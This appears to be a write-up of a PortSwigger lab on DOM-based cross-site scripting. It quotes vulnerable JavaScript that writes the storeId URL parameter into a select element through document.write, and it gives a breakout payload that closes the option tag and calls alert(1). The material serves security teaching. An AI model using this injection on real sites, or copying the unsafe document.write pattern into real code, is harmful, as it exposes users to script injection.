
# DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

---------------------------------------------

References:

- https://portswigger.net/web-security/cross-site-scripting/dom-based

---------------------------------------------


The vulnerable code path is shown below:

```
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```




<img width="555" height="226" alt="1" src="https://github.com/user-attachments/assets/3341b578-48d7-4207-96dd-93c7daef4a48" />



The `storeId` parameter is inserted between `<option selected>` and `</option>`. Supplying a value in the GET request therefore places it inside the option list, as illustrated by `/product?productId=4&storeId=1`:



<img width="465" height="137" alt="2" src="https://github.com/user-attachments/assets/1e1e6923-d5f0-4388-b987-5ae8d08c9e48" />



To break out of the option element, use this payload:

```
</option><script>alert(1)</script><option selected>
```

```
/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>
```



<img width="716" height="210" alt="3" src="https://github.com/user-attachments/assets/37726e4c-ffee-4b25-9cb8-7d0440d9eb32" />

